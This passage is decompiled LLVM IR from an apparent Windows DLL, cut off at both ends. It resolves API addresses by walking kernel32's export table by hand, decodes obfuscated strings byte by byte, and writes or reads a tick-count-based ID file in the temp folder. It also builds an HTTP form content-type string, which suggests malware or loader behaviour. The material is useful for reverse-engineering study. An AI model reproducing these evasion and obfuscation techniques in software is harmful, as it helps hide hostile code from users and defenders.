  %229 = call i32 @__asm_int3(), !insn.addr !5045
  %230 = call i32 @__asm_int3(), !insn.addr !5046
  %231 = call i32 @__asm_int3(), !insn.addr !5047
  %232 = call i32 @__asm_int3(), !insn.addr !5048
  %233 = call i32 @__asm_int3(), !insn.addr !5049
  ret i32 %233, !insn.addr !5049
}

define i32 @function_10008c90() local_unnamed_addr {
dec_label_pc_10008c90:
  %esi.3.reg2mem = alloca i32, !insn.addr !5050
  %esi.2.reg2mem = alloca i32, !insn.addr !5050
  %edx.1.reg2mem = alloca i32, !insn.addr !5050
  %esi.1.reg2mem = alloca i32, !insn.addr !5050
  %esi.0.reg2mem = alloca i32, !insn.addr !5050
  %edx.0.reg2mem = alloca i32, !insn.addr !5050
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-1308 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-107 = alloca i32, align 4
  %stack_var_-1312 = alloca i32, align 4
  %1 = call i32* @_memset(i32* nonnull %stack_var_-107, i32 0, i32 99), !insn.addr !5051
  store i32 1852990827, i32* %stack_var_-108, align 4, !insn.addr !5052
  %2 = bitcast i32* %stack_var_-108 to i8*
  %3 = call i32* @GetModuleHandleA(i8* nonnull %2), !insn.addr !5053
  %4 = ptrtoint i32* %3 to i32, !insn.addr !5053
  store i32 1684107084, i32* %stack_var_-208, align 4, !insn.addr !5054
  %5 = add i32 %4, 60, !insn.addr !5055
  %6 = inttoptr i32 %5 to i32*, !insn.addr !5055
  %7 = load i32, i32* %6, align 4, !insn.addr !5055
  %8 = add i32 %4, 120, !insn.addr !5056
  %9 = add i32 %8, %7, !insn.addr !5056
  %10 = inttoptr i32 %9 to i32*, !insn.addr !5056
  %11 = load i32, i32* %10, align 4, !insn.addr !5056
  %12 = add i32 %11, %4, !insn.addr !5057
  %13 = call i32 @function_10009e60(i32 %4, i32* nonnull %stack_var_-208), !insn.addr !5058
  %14 = add i32 %12, 36, !insn.addr !5059
  %15 = inttoptr i32 %14 to i32*, !insn.addr !5059
  %16 = load i32, i32* %15, align 4, !insn.addr !5059
  %17 = mul i32 %13, 2, !insn.addr !5060
  %18 = add i32 %17, %4, !insn.addr !5060
  %19 = add i32 %18, %16, !insn.addr !5061
  %20 = inttoptr i32 %19 to i16*, !insn.addr !5061
  %21 = load i16, i16* %20, align 2, !insn.addr !5061
  %22 = zext i16 %21 to i32, !insn.addr !5061
  %23 = add i32 %12, 28, !insn.addr !5062
  %24 = inttoptr i32 %23 to i32*, !insn.addr !5062
  %25 = load i32, i32* %24, align 4, !insn.addr !5062
  %26 = mul i32 %22, 4, !insn.addr !5063
  %27 = add i32 %25, %4, !insn.addr !5063
  %28 = add i32 %27, %26, !insn.addr !5064
  %29 = inttoptr i32 %28 to i32*, !insn.addr !5064
  %30 = load i32, i32* %29, align 4, !insn.addr !5064
  %31 = add i32 %30, %4, !insn.addr !5065
  store i32 %31, i32* @global_var_1004094c, align 4, !insn.addr !5066
  %32 = bitcast i32* %stack_var_-1308 to i16*
  %33 = call i32 @GetTempPathW(i32 500, i16* nonnull %32), !insn.addr !5067
  %34 = call i128 @__asm_movaps(i128 9190584119303853135345745395796), !insn.addr !5068
  call void @__asm_movups(i128 undef, i128 %34), !insn.addr !5069
  %35 = call i16* @lstrcatW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5070
  %36 = call i32* @CreateFileW(i16* nonnull %32, i32 -2147483648, i32 7, %_SECURITY_ATTRIBUTES* null, i32 3, i32 128, i32* null), !insn.addr !5071
  store i32 200, i32* %stack_var_-1312, align 4, !insn.addr !5072
  %37 = icmp eq i32* %36, inttoptr (i32 -1 to i32*), !insn.addr !5073
  %38 = icmp eq i1 %37, false, !insn.addr !5074
  br i1 %38, label %dec_label_pc_10008e38, label %dec_label_pc_10008da7, !insn.addr !5074

dec_label_pc_10008da7:                            ; preds = %dec_label_pc_10008c90
  %39 = call i32 @GetTickCount(), !insn.addr !5075
  %40 = icmp eq i32 %39, 0, !insn.addr !5076
  store i32 %39, i32* %edx.0.reg2mem, !insn.addr !5077
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !5077
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !5077
  br i1 %40, label %dec_label_pc_10008dd4, label %dec_label_pc_10008db5, !insn.addr !5077

dec_label_pc_10008db5:                            ; preds = %dec_label_pc_10008da7, %dec_label_pc_10008db5
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %41 = and i32 %edx.0.reload, 15, !insn.addr !5078
  %42 = and i32 %edx.0.reload, 14
  %43 = icmp ult i32 %42, 10
  %44 = add nuw nsw i32 %41, 55
  %45 = or i32 %41, 48
  %.pn = select i1 %43, i32 %45, i32 %44
  %46 = trunc i32 %.pn to i8, !insn.addr !5079
  %47 = add i32 %esi.0.reload, %0, !insn.addr !5079
  %48 = inttoptr i32 %47 to i8*, !insn.addr !5079
  store i8 %46, i8* %48, align 1, !insn.addr !5079
  %49 = add i32 %esi.0.reload, 1, !insn.addr !5080
  %50 = udiv i32 %edx.0.reload, 16, !insn.addr !5081
  %51 = icmp ult i32 %edx.0.reload, 16
  %52 = icmp eq i1 %51, false, !insn.addr !5082
  store i32 %50, i32* %edx.0.reg2mem, !insn.addr !5082
  store i32 %49, i32* %esi.0.reg2mem, !insn.addr !5082
  store i32 %49, i32* %esi.1.reg2mem, !insn.addr !5082
  br i1 %52, label %dec_label_pc_10008db5, label %dec_label_pc_10008dd4, !insn.addr !5082

dec_label_pc_10008dd4:                            ; preds = %dec_label_pc_10008db5, %dec_label_pc_10008da7
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %53 = call i32* @CreateFileW(i16* nonnull %32, i32 1073741824, i32 7, %_SECURITY_ATTRIBUTES* null, i32 2, i32 128, i32* null), !insn.addr !5083
  %54 = call i32 @GetTickCount(), !insn.addr !5084
  %55 = icmp eq i32 %54, 0, !insn.addr !5085
  store i32 %54, i32* %edx.1.reg2mem, !insn.addr !5086
  store i32 %esi.1.reload, i32* %esi.2.reg2mem, !insn.addr !5086
  store i32 %esi.1.reload, i32* %esi.3.reg2mem, !insn.addr !5086
  br i1 %55, label %dec_label_pc_10008e1f, label %dec_label_pc_10008e00, !insn.addr !5086

dec_label_pc_10008e00:                            ; preds = %dec_label_pc_10008dd4, %dec_label_pc_10008e00
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %56 = and i32 %edx.1.reload, 15, !insn.addr !5087
  %57 = and i32 %edx.1.reload, 14
  %58 = icmp ult i32 %57, 10
  %59 = add nuw nsw i32 %56, 55
  %60 = or i32 %56, 48
  %.pn11 = select i1 %58, i32 %60, i32 %59
  %61 = trunc i32 %.pn11 to i8, !insn.addr !5088
  %62 = add i32 %esi.2.reload, %0, !insn.addr !5088
  %63 = inttoptr i32 %62 to i8*, !insn.addr !5088
  store i8 %61, i8* %63, align 1, !insn.addr !5088
  %64 = add i32 %esi.2.reload, 1, !insn.addr !5089
  %65 = udiv i32 %edx.1.reload, 16, !insn.addr !5090
  %66 = icmp ult i32 %edx.1.reload, 16
  %67 = icmp eq i1 %66, false, !insn.addr !5091
  store i32 %65, i32* %edx.1.reg2mem, !insn.addr !5091
  store i32 %64, i32* %esi.2.reg2mem, !insn.addr !5091
  store i32 %64, i32* %esi.3.reg2mem, !insn.addr !5091
  br i1 %67, label %dec_label_pc_10008e00, label %dec_label_pc_10008e1f, !insn.addr !5091

dec_label_pc_10008e1f:                            ; preds = %dec_label_pc_10008e00, %dec_label_pc_10008dd4
  %esi.3.reload = load i32, i32* %esi.3.reg2mem
  %68 = add i32 %esi.3.reload, %0, !insn.addr !5092
  %69 = inttoptr i32 %68 to i8*, !insn.addr !5092
  store i8 0, i8* %69, align 1, !insn.addr !5092
  %70 = inttoptr i32 %0 to i32*, !insn.addr !5093
  %71 = call i1 @WriteFile(i32* %53, i32* %70, i32 %esi.3.reload, i32* nonnull %stack_var_-1312, %_OVERLAPPED* null), !insn.addr !5093
  br label %dec_label_pc_10008e56, !insn.addr !5094

dec_label_pc_10008e38:                            ; preds = %dec_label_pc_10008c90
  %72 = inttoptr i32 %0 to %_SECURITY_ATTRIBUTES*, !insn.addr !5095
  %73 = getelementptr inbounds %_SECURITY_ATTRIBUTES, %_SECURITY_ATTRIBUTES* %72, i32 0, i32 0
  %74 = call i1 @ReadFile(i32* %36, i32* %73, i32 100, i32* nonnull %stack_var_-1312, %_OVERLAPPED* null), !insn.addr !5096
  %75 = load i32, i32* %stack_var_-1312, align 4, !insn.addr !5097
  %76 = add i32 %75, %0, !insn.addr !5098
  %77 = inttoptr i32 %76 to i8*, !insn.addr !5098
  store i8 0, i8* %77, align 1, !insn.addr !5098
  br label %dec_label_pc_10008e56, !insn.addr !5098

dec_label_pc_10008e56:                            ; preds = %dec_label_pc_10008e38, %dec_label_pc_10008e1f
  %78 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !5099
  %79 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5100
  ret i32 %79, !insn.addr !5101
}

define i32 @function_10008e70(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008e70:
  %esp.2.reg2mem = alloca i32, !insn.addr !5102
  %.reg2mem = alloca i8*, !insn.addr !5102
  %esi.0.reg2mem = alloca i32, !insn.addr !5102
  %esp.1.reg2mem = alloca i32, !insn.addr !5102
  %edi.0.reg2mem = alloca i32, !insn.addr !5102
  %esp.0.reg2mem = alloca i32, !insn.addr !5102
  %eax.1.reg2mem = alloca i32, !insn.addr !5102
  %eax.0.reg2mem = alloca i32, !insn.addr !5102
  %stack_var_-1184 = alloca i8*, align 4
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-1244 = alloca i32, align 4
  %stack_var_-108 = alloca i128, align 8
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__decompiler_undefined_function_3()
  %3 = call i128 @__decompiler_undefined_function_3()
  %4 = call i128 @__decompiler_undefined_function_3()
  %5 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-220 = alloca i128, align 8
  %6 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-1020 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %7 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !5103
  %8 = bitcast i32* %stack_var_-1180 to i8*
  %9 = call i8* @lstrcpyA(i8* nonnull %8, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_10039468, i32 0, i32 0)), !insn.addr !5104
  %10 = bitcast i32* %stack_var_-1100 to i8*
  %11 = call i8* @lstrcpyA(i8* nonnull %10, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_100394ac, i32 0, i32 0)), !insn.addr !5105
  %12 = bitcast i32* %stack_var_-1020 to i8*
  %13 = call i8* @lstrcpyA(i8* nonnull %12, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_100394d4, i32 0, i32 0)), !insn.addr !5106
  %14 = load i128, i128* @global_var_10039be0, align 4, !insn.addr !5107
  %15 = call i128 @__asm_movaps(i128 %14), !insn.addr !5107
  %16 = load i128, i128* @global_var_100399a0, align 4, !insn.addr !5108
  %17 = call i128 @__asm_movaps(i128 %16), !insn.addr !5108
  call void @__asm_movups(i128 %6, i128 %15), !insn.addr !5109
  %18 = load i128, i128* @global_var_10039ac0, align 4, !insn.addr !5110
  %19 = call i128 @__asm_movaps(i128 %18), !insn.addr !5110
  call void @__asm_movups(i128 %5, i128 %19), !insn.addr !5111
  %20 = load i128, i128* @global_var_10039b70, align 4, !insn.addr !5112
  %21 = call i128 @__asm_movaps(i128 %20), !insn.addr !5112
  call void @__asm_movups(i128 %4, i128 %21), !insn.addr !5113
  %22 = load i128, i128* @global_var_10039ab0, align 4, !insn.addr !5114
  %23 = call i128 @__asm_movaps(i128 %22), !insn.addr !5114
  call void @__asm_movups(i128 %3, i128 %23), !insn.addr !5115
  %24 = load i128, i128* @global_var_10039b90, align 4, !insn.addr !5116
  %25 = call i128 @__asm_movaps(i128 %24), !insn.addr !5116
  call void @__asm_movups(i128 %2, i128 %25), !insn.addr !5117
  %26 = load i128, i128* @global_var_10039a10, align 4, !insn.addr !5118
  %27 = call i128 @__asm_movaps(i128 %26), !insn.addr !5118
  call void @__asm_movups(i128 %1, i128 %27), !insn.addr !5119
  %28 = add i32 %7, -216, !insn.addr !5120
  %29 = add i32 %7, -200
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !5121
  br label %dec_label_pc_10008f50, !insn.addr !5121

dec_label_pc_10008f50:                            ; preds = %dec_label_pc_10008f50, %dec_label_pc_10008e70
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %30 = add i32 %eax.0.reload, %28, !insn.addr !5120
  %31 = inttoptr i32 %30 to i128*, !insn.addr !5120
  %32 = load i128, i128* %31, align 4, !insn.addr !5120
  %33 = call i128 @__asm_movups.35(i128 %32), !insn.addr !5120
  %34 = call i128 @__asm_psubb(i128 %33, i128 %17), !insn.addr !5122
  %35 = load i128, i128* %31, align 4, !insn.addr !5123
  call void @__asm_movups(i128 %35, i128 %34), !insn.addr !5123
  %36 = add i32 %29, %eax.0.reload, !insn.addr !5124
  %37 = inttoptr i32 %36 to i128*, !insn.addr !5124
  %38 = load i128, i128* %37, align 4, !insn.addr !5124
  %39 = call i128 @__asm_movups.35(i128 %38), !insn.addr !5124
  %40 = call i128 @__asm_psubb(i128 %39, i128 %17), !insn.addr !5125
  %41 = load i128, i128* %37, align 4, !insn.addr !5126
  call void @__asm_movups(i128 %41, i128 %40), !insn.addr !5126
  %42 = add nuw nsw i32 %eax.0.reload, 32, !insn.addr !5127
  %43 = icmp ult i32 %42, 96, !insn.addr !5128
  store i32 %42, i32* %eax.0.reg2mem, !insn.addr !5129
  store i32 96, i32* %eax.1.reg2mem, !insn.addr !5129
  br i1 %43, label %dec_label_pc_10008f50, label %dec_label_pc_10008f85, !insn.addr !5129

dec_label_pc_10008f85:                            ; preds = %dec_label_pc_10008f50, %dec_label_pc_10008f85
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %44 = add i32 %eax.1.reload, %28, !insn.addr !5130
  %45 = inttoptr i32 %44 to i8*, !insn.addr !5130
  %46 = load i8, i8* %45, align 1, !insn.addr !5130
  %47 = add i8 %46, -1, !insn.addr !5130
  store i8 %47, i8* %45, align 1, !insn.addr !5130
  %48 = add nuw nsw i32 %eax.1.reload, 1, !insn.addr !5131
  %exitcond = icmp eq i32 %48, 109
  store i32 %48, i32* %eax.1.reg2mem, !insn.addr !5132
  br i1 %exitcond, label %dec_label_pc_10008f92, label %dec_label_pc_10008f85, !insn.addr !5132

dec_label_pc_10008f92:                            ; preds = %dec_label_pc_10008f85
  %49 = call i128 @__asm_movaps(i128 166805081916227960428736578614880631), !insn.addr !5133
  %50 = ptrtoint i128* %stack_var_-108 to i32, !insn.addr !5134
  store i32 %50, i32* %stack_var_-1244, align 4, !insn.addr !5134
  call void @__asm_movups(i128 undef, i128 %49), !insn.addr !5135
  store i128 1702129225, i128* %stack_var_-108, align 8, !insn.addr !5136
  %51 = add i32 %0, 120, !insn.addr !5137
  %52 = add i32 %51, %50, !insn.addr !5137
  %53 = inttoptr i32 %52 to i32*, !insn.addr !5137
  %54 = load i32, i32* %53, align 4, !insn.addr !5137
  %55 = add i32 %54, %50, !insn.addr !5138
  %56 = bitcast i128* %stack_var_-108 to i32*, !insn.addr !5139
  %57 = call i32 @function_10009e60(i32 %50, i32* nonnull %56), !insn.addr !5139
  %58 = add i32 %55, 36, !insn.addr !5140
  %59 = inttoptr i32 %58 to i32*, !insn.addr !5140
  %60 = load i32, i32* %59, align 4, !insn.addr !5140
  %61 = load i128, i128* @global_var_10039b40, align 4, !insn.addr !5141
  %62 = call i128 @__asm_movaps(i128 %61), !insn.addr !5141
  %63 = mul i32 %57, 2, !insn.addr !5142
  %64 = add i32 %63, %50, !insn.addr !5142
  %65 = add i32 %64, %60, !insn.addr !5143
  %66 = inttoptr i32 %65 to i16*, !insn.addr !5143
  %67 = load i16, i16* %66, align 2, !insn.addr !5143
  %68 = zext i16 %67 to i32, !insn.addr !5143
  %69 = add i32 %55, 28, !insn.addr !5144
  %70 = inttoptr i32 %69 to i32*, !insn.addr !5144
  %71 = load i32, i32* %70, align 4, !insn.addr !5144
  %72 = mul i32 %68, 4, !insn.addr !5145
  %73 = add i32 %71, %50, !insn.addr !5145
  %74 = add i32 %73, %72, !insn.addr !5146
  %75 = inttoptr i32 %74 to i32*, !insn.addr !5146
  %76 = load i32, i32* %75, align 4, !insn.addr !5146
  %77 = add i32 %76, %50, !insn.addr !5147
  call void @__asm_movups(i128 undef, i128 %62), !insn.addr !5148
  store i32 %77, i32* @global_var_100409ec, align 4, !insn.addr !5149
  %78 = load i32, i32* %53, align 4, !insn.addr !5150
  %79 = add i32 %78, %50, !insn.addr !5151
  %80 = call i32 @function_10009e60(i32 %50, i32* nonnull %56), !insn.addr !5152
  %81 = add i32 %79, 36, !insn.addr !5153
  %82 = inttoptr i32 %81 to i32*, !insn.addr !5153
  %83 = load i32, i32* %82, align 4, !insn.addr !5153
  %84 = load i128, i128* @global_var_10039a50, align 4, !insn.addr !5154
  %85 = call i128 @__asm_movaps(i128 %84), !insn.addr !5154
  %86 = mul i32 %80, 2, !insn.addr !5155
  %87 = add i32 %86, %50, !insn.addr !5155
  %88 = add i32 %87, %83, !insn.addr !5156
  %89 = inttoptr i32 %88 to i16*, !insn.addr !5156
  %90 = load i16, i16* %89, align 2, !insn.addr !5156
  %91 = zext i16 %90 to i32, !insn.addr !5156
  %92 = add i32 %79, 28, !insn.addr !5157
  %93 = inttoptr i32 %92 to i32*, !insn.addr !5157
  %94 = load i32, i32* %93, align 4, !insn.addr !5157
  %95 = mul i32 %91, 4, !insn.addr !5158
  %96 = add i32 %94, %50, !insn.addr !5158
  %97 = add i32 %96, %95, !insn.addr !5159
  %98 = inttoptr i32 %97 to i32*, !insn.addr !5159
  %99 = load i32, i32* %98, align 4, !insn.addr !5159
  %100 = add i32 %99, %50, !insn.addr !5160
  call void @__asm_movups(i128 undef, i128 %85), !insn.addr !5161
  store i32 %100, i32* @global_var_10040954, align 4, !insn.addr !5162
  %101 = load i32, i32* %53, align 4, !insn.addr !5163
  %102 = add i32 %101, %50, !insn.addr !5164
  %103 = call i32 @function_10009e60(i32 %50, i32* nonnull %56), !insn.addr !5165
  %104 = add i32 %102, 36, !insn.addr !5166
  %105 = inttoptr i32 %104 to i32*, !insn.addr !5166
  %106 = load i32, i32* %105, align 4, !insn.addr !5166
  %107 = load i128, i128* @global_var_10039a60, align 4, !insn.addr !5167
  %108 = call i128 @__asm_movaps(i128 %107), !insn.addr !5167
  %109 = mul i32 %103, 2, !insn.addr !5168
  %110 = add i32 %109, %50, !insn.addr !5168
  %111 = add i32 %110, %106, !insn.addr !5169
  %112 = inttoptr i32 %111 to i16*, !insn.addr !5169
  %113 = load i16, i16* %112, align 2, !insn.addr !5169
  %114 = zext i16 %113 to i32, !insn.addr !5169
  %115 = add i32 %102, 28, !insn.addr !5170
  %116 = inttoptr i32 %115 to i32*, !insn.addr !5170
  %117 = load i32, i32* %116, align 4, !insn.addr !5170
  %118 = mul i32 %114, 4, !insn.addr !5171
  %119 = add i32 %117, %50, !insn.addr !5171
  %120 = add i32 %119, %118, !insn.addr !5172
  %121 = inttoptr i32 %120 to i32*, !insn.addr !5172
  %122 = load i32, i32* %121, align 4, !insn.addr !5172
  %123 = add i32 %122, %50, !insn.addr !5173
  call void @__asm_movups(i128 undef, i128 %108), !insn.addr !5174
  store i32 %123, i32* @global_var_1004093c, align 4, !insn.addr !5175
  %124 = load i32, i32* %53, align 4, !insn.addr !5176
  %125 = add i32 %124, %50, !insn.addr !5177
  %126 = call i32 @function_10009e60(i32 %50, i32* nonnull %56), !insn.addr !5178
  %127 = add i32 %125, 36, !insn.addr !5179
  %128 = inttoptr i32 %127 to i32*, !insn.addr !5179
  %129 = load i32, i32* %128, align 4, !insn.addr !5179
  %130 = load i128, i128* @global_var_10039bf0, align 4, !insn.addr !5180
  %131 = call i128 @__asm_movaps(i128 %130), !insn.addr !5180
  %132 = ptrtoint i32* %stack_var_-1244 to i32, !insn.addr !5181
  %133 = mul i32 %126, 2, !insn.addr !5182
  %134 = add i32 %133, %50, !insn.addr !5182
  %135 = add i32 %134, %129, !insn.addr !5183
  %136 = inttoptr i32 %135 to i16*, !insn.addr !5183
  %137 = load i16, i16* %136, align 2, !insn.addr !5183
  %138 = zext i16 %137 to i32, !insn.addr !5183
  %139 = add i32 %125, 28, !insn.addr !5184
  %140 = inttoptr i32 %139 to i32*, !insn.addr !5184
  %141 = load i32, i32* %140, align 4, !insn.addr !5184
  %142 = mul i32 %138, 4, !insn.addr !5185
  %143 = add i32 %141, %50, !insn.addr !5185
  %144 = add i32 %143, %142, !insn.addr !5186
  %145 = inttoptr i32 %144 to i32*, !insn.addr !5186
  %146 = load i32, i32* %145, align 4, !insn.addr !5186
  %147 = add i32 %146, %50, !insn.addr !5187
  store i32 %147, i32* @global_var_100409e4, align 4, !insn.addr !5188
  call void @__asm_movups(i128 undef, i128 %131), !insn.addr !5189
  %148 = call i32 @function_10009390(), !insn.addr !5190
  %149 = load i128, i128* @global_var_10039b30, align 4, !insn.addr !5191
  %150 = call i128 @__asm_movaps(i128 %149), !insn.addr !5191
  store i32 %148, i32* @global_var_10040948, align 4, !insn.addr !5192
  call void @__asm_movups(i128 undef, i128 %150), !insn.addr !5193
  %151 = call i32 @function_10009390(), !insn.addr !5194
  %152 = load i128, i128* @global_var_10039a70, align 4, !insn.addr !5195
  %153 = call i128 @__asm_movaps(i128 %152), !insn.addr !5195
  store i32 %151, i32* @global_var_100409b4, align 4, !insn.addr !5196
  call void @__asm_movups(i128 undef, i128 %153), !insn.addr !5197
  %154 = call i32 @function_10009390(), !insn.addr !5198
  %155 = load i128, i128* @global_var_10039b80, align 4, !insn.addr !5199
  %156 = call i128 @__asm_movaps(i128 %155), !insn.addr !5199
  store i32 %154, i32* @global_var_10040980, align 4, !insn.addr !5200
  call void @__asm_movups(i128 undef, i128 %156), !insn.addr !5201
  %157 = call i32 @function_10009390(), !insn.addr !5202
  %158 = load i128, i128* @global_var_10039c10, align 4, !insn.addr !5203
  %159 = call i128 @__asm_movaps(i128 %158), !insn.addr !5203
  call void @__asm_movups(i128 undef, i128 %159), !insn.addr !5204
  %160 = call i32 @function_10009390(), !insn.addr !5205
  %161 = ptrtoint i32* %stack_var_-1180 to i32, !insn.addr !5206
  store i32 %160, i32* @global_var_100409e8, align 4, !insn.addr !5207
  store i8* inttoptr (i32 12 to i8*), i8** %stack_var_-1184, align 4, !insn.addr !5208
  store i32 %132, i32* %esp.0.reg2mem, !insn.addr !5208
  store i32 %161, i32* %edi.0.reg2mem, !insn.addr !5208
  br label %dec_label_pc_10009190, !insn.addr !5208

dec_label_pc_10009190:                            ; preds = %dec_label_pc_100091ab, %dec_label_pc_10008f92
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %162 = add i32 %esp.0.reload, -4, !insn.addr !5209
  %163 = inttoptr i32 %162 to i32*, !insn.addr !5209
  store i32 %edi.0.reload, i32* %163, align 4, !insn.addr !5209
  %164 = load i8*, i8** %stack_var_-1184, align 4, !insn.addr !5210
  %165 = call i32 @lstrlenA(i8* %164), !insn.addr !5210
  %166 = icmp slt i32 %165, 1
  store i32 %162, i32* %esp.1.reg2mem, !insn.addr !5211
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !5211
  store i8* %164, i8** %.reg2mem, !insn.addr !5211
  store i32 %162, i32* %esp.2.reg2mem, !insn.addr !5211
  br i1 %166, label %dec_label_pc_100091ab, label %dec_label_pc_100091a0, !insn.addr !5211

dec_label_pc_100091a0:                            ; preds = %dec_label_pc_10009190, %dec_label_pc_100091a0
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %167 = add i32 %esi.0.reload, %edi.0.reload, !insn.addr !5212
  %168 = inttoptr i32 %167 to i8*, !insn.addr !5212
  %169 = load i8, i8* %168, align 1, !insn.addr !5212
  %170 = add i8 %169, -1, !insn.addr !5212
  store i8 %170, i8* %168, align 1, !insn.addr !5212
  %171 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !5213
  %172 = add i32 %esp.1.reload, -4, !insn.addr !5214
  %173 = inttoptr i32 %172 to i32*, !insn.addr !5214
  store i32 %edi.0.reload, i32* %173, align 4, !insn.addr !5214
  %174 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !5215
  %175 = icmp slt i32 %171, %174, !insn.addr !5216
  store i32 %172, i32* %esp.1.reg2mem, !insn.addr !5216
  store i32 %171, i32* %esi.0.reg2mem, !insn.addr !5216
  br i1 %175, label %dec_label_pc_100091a0, label %dec_label_pc_100091ab.loopexit, !insn.addr !5216

dec_label_pc_100091ab.loopexit:                   ; preds = %dec_label_pc_100091a0
  %.pre12 = load i8*, i8** %stack_var_-1184, align 4
  store i8* %.pre12, i8** %.reg2mem
  store i32 %172, i32* %esp.2.reg2mem
  br label %dec_label_pc_100091ab

dec_label_pc_100091ab:                            ; preds = %dec_label_pc_100091ab.loopexit, %dec_label_pc_10009190
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %.reload = load i8*, i8** %.reg2mem, !insn.addr !5217
  %176 = add i32 %edi.0.reload, 80, !insn.addr !5218
  %177 = ptrtoint i8* %.reload to i32, !insn.addr !5217
  %178 = add i32 %177, -1, !insn.addr !5217
  %179 = icmp eq i32 %178, 0, !insn.addr !5217
  %180 = inttoptr i32 %178 to i8*, !insn.addr !5217
  store i8* %180, i8** %stack_var_-1184, align 4, !insn.addr !5217
  %181 = icmp eq i1 %179, false, !insn.addr !5219
  store i32 %esp.2.reload, i32* %esp.0.reg2mem, !insn.addr !5219
  store i32 %176, i32* %edi.0.reg2mem, !insn.addr !5219
  br i1 %181, label %dec_label_pc_10009190, label %dec_label_pc_100091b7, !insn.addr !5219

dec_label_pc_100091b7:                            ; preds = %dec_label_pc_100091ab
  %182 = add i32 %esp.2.reload, -4, !insn.addr !5220
  %183 = inttoptr i32 %182 to i32*, !insn.addr !5220
  store i32 50, i32* %183, align 4, !insn.addr !5220
  %184 = add i32 %esp.2.reload, -8, !insn.addr !5221
  %185 = inttoptr i32 %184 to i32*, !insn.addr !5221
  store i32 64, i32* %185, align 4, !insn.addr !5221
  %186 = load i8*, i8** %stack_var_-1184, align 4, !insn.addr !5222
  %187 = ptrtoint i8* %186 to i32, !insn.addr !5222
  %188 = call i32* @LocalAlloc(i32 %187, i32 ptrtoint (i32* @1 to i32)), !insn.addr !5222
  %189 = ptrtoint i32* %188 to i32, !insn.addr !5222
  %190 = add i32 %esp.2.reload, -12, !insn.addr !5223
  %191 = inttoptr i32 %190 to i32*, !insn.addr !5223
  store i32 0, i32* %191, align 4, !insn.addr !5223
  %192 = add i32 %esp.2.reload, -16, !insn.addr !5224
  %193 = inttoptr i32 %192 to i32*, !insn.addr !5224
  store i32 0, i32* %193, align 4, !insn.addr !5224
  %194 = add i32 %esp.2.reload, -20, !insn.addr !5225
  %195 = inttoptr i32 %194 to i32*, !insn.addr !5225
  store i32 0, i32* %195, align 4, !insn.addr !5225
  store i32 1819308129, i32* %188, align 4, !insn.addr !5226
  %196 = add i32 %189, 4, !insn.addr !5227
  %197 = inttoptr i32 %196 to i32*, !insn.addr !5227
  store i32 1952539497, i32* %197, align 4, !insn.addr !5227
  %198 = add i32 %189, 8, !insn.addr !5228
  %199 = inttoptr i32 %198 to i32*, !insn.addr !5228
  store i32 795766633, i32* %199, align 4, !insn.addr !5228
  %200 = add i32 %189, 12, !insn.addr !5229
  %201 = inttoptr i32 %200 to i32*, !insn.addr !5229
  store i32 2004299128, i32* %201, align 4, !insn.addr !5229
  %202 = add i32 %189, 16, !insn.addr !5230
  %203 = inttoptr i32 %202 to i32*, !insn.addr !5230
  store i32 1868967287, i32* %203, align 4, !insn.addr !5230
  %204 = add i32 %189, 20, !insn.addr !5231
  %205 = inttoptr i32 %204 to i32*, !insn.addr !5231
  store i32 1965911410, i32* %205, align 4, !insn.addr !5231
  %206 = add i32 %189, 24, !insn.addr !5232
  %207 = inttoptr i32 %206 to i32*, !insn.addr !5232
  store i32 1852140658, i32* %207, align 4, !insn.addr !5232
  %208 = add i32 %189, 28, !insn.addr !5233
  %209 = inttoptr i32 %208 to i32*, !insn.addr !5233
  store i32 1701080931, i32* %209, align 4, !insn.addr !5233
  %210 = add i32 %189, 32, !insn.addr !5234
  %211 = inttoptr i32 %210 to i16*, !insn.addr !5234
  store i16 100, i16* %211, align 2, !insn.addr !5234
  %212 = add i32 %esp.2.reload, -24, !insn.addr !5235
  %213 = inttoptr i32 %212 to i32*, !insn.addr !5235
  store i32 1, i32* %213, align 4, !insn.addr !5235
  %214 = add i32 %esp.2.reload, -28, !insn.addr !5236
  %215 = inttoptr i32 %214 to i32*, !insn.addr !5236
  %216 = ptrtoint i128* %stack_var_-220 to i32, !insn.addr !5236
  store i32 %216, i32* %215, align 4, !insn.addr !5236
  store i32 %216, i32* @global_var_10040984, align 4, !insn.addr !5237
  %217 = add i32 %esp.2.reload, -32, !insn.addr !5238
  %218 = inttoptr i32 %217 to i32*, !insn.addr !5238
